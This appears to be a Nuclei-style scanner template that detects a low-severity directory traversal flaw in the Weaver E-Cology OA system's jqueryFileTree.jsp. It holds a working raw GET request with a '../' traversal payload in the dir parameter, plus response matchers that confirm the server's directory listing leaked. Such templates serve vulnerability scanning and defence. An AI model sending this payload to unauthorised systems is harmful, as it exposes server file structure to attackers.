id: fanweiOA-E-Cology-jqueryFileTree_jsp-dir-listing

info:
  name: 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞
  severity: low
  author: cnaq
  description: 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20jqueryFileTree.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
  tags: fanwei,oa,ecology,dir

requests:
  - raw:
      - |
        GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: and
        words:
          - "$%^&[['"
          - ".jsp"

      - type: word
        words:
          - "Login.jsp"
        part: body
        negative: true